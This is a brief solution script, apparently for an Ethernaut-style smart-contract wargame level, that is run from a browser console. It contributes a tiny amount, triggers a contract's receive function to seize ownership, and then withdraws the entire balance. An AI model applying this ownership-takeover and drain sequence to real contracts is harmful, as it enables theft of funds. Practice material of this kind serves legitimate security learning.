/** solved on browser's console */

/** 
 * SET contribute[msg.sender] > 0 
*/
await contract.contribute({from: player, to: instance, value: toWei('0.0001')}) 

/** 
 * SendTransaction for Attack receive function 
 * For Change owner to msg.sender
*/
await contract.sendTransaction({from: player, to: instance, value: toWei('0.01')})

/**
 * Withdraw All balance
 */
await contract.withdraw()